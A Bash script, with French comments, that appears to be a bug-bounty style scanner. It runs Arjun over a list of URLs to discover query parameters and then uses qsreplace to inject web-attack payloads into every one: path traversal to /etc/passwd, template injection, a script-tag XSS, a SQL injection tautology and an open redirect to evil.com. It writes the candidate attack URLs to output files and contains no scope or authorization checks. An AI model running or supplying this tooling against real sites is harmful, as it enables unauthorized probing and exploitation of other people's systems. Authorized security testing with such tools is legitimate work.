#!/bin/bash

if [ $# -ne 1 ]; then
    echo "Usage: $0 fichier_urls.txt"
    exit 1
fi

INPUT=$1
OUTPUT_DIR="scan_params_results"
mkdir -p "$OUTPUT_DIR"

LFI_PAYLOAD="../../../../../../etc/passwd"
SSTI_PAYLOAD="{{7*7}}"
XSS_PAYLOAD="<script>alert(1)</script>"
SQLI_PAYLOAD="' OR '1'='1"
REDIRECT_PAYLOAD="https://evil.com"

ARJUN_PARAMS="$OUTPUT_DIR/arjun_params.txt"
> "$ARJUN_PARAMS"  # fichier propre au départ

echo "[*] Début scan paramètres vulnérables..."
echo "[*] Entrée : $INPUT"
echo "[*] Résultats dans : $OUTPUT_DIR"

while read -r url; do
    echo "[+] Analyse de $url"

    # Lance Arjun et ajoute les résultats dans arjun_params.txt
    arjun -u "$url" --get -oT "$OUTPUT_DIR/arjun_tmp.txt" > /dev/null 2>&1

    if [ -s "$OUTPUT_DIR/arjun_tmp.txt" ]; then
        cat "$OUTPUT_DIR/arjun_tmp.txt" >> "$ARJUN_PARAMS"
    fi
done < "$INPUT"

# Supprime doublons dans arjun_params.txt
sort -u "$ARJUN_PARAMS" -o "$ARJUN_PARAMS"

echo "[*] Paramètres uniques extraits : $(wc -l < $ARJUN_PARAMS)"

# Injection des payloads dans chaque paramètre unique
cat "$ARJUN_PARAMS" | qsreplace "$LFI_PAYLOAD" | tee "$OUTPUT_DIR/lfi_candidates.txt" > /dev/null
cat "$ARJUN_PARAMS" | qsreplace "$SSTI_PAYLOAD" | tee "$OUTPUT_DIR/ssti_candidates.txt" > /dev/null
cat "$ARJUN_PARAMS" | qsreplace "$XSS_PAYLOAD" | tee "$OUTPUT_DIR/xss_candidates.txt" > /dev/null
cat "$ARJUN_PARAMS" | qsreplace "$SQLI_PAYLOAD" | tee "$OUTPUT_DIR/sqli_candidates.txt" > /dev/null
cat "$ARJUN_PARAMS" | qsreplace "$REDIRECT_PAYLOAD" | tee "$OUTPUT_DIR/open_redirect_candidates.txt" > /dev/null

rm -f "$OUTPUT_DIR/arjun_tmp.txt"

echo "[✔] Scan terminé."
echo "    -> LFI : $OUTPUT_DIR/lfi_candidates.txt"
echo "    -> SSTI : $OUTPUT_DIR/ssti_candidates.txt"
echo "    -> XSS : $OUTPUT_DIR/xss_candidates.txt"
echo "    -> SQLi : $OUTPUT_DIR/sqli_candidates.txt"
echo "    -> Open Redirect : $OUTPUT_DIR/open_redirect_candidates.txt"
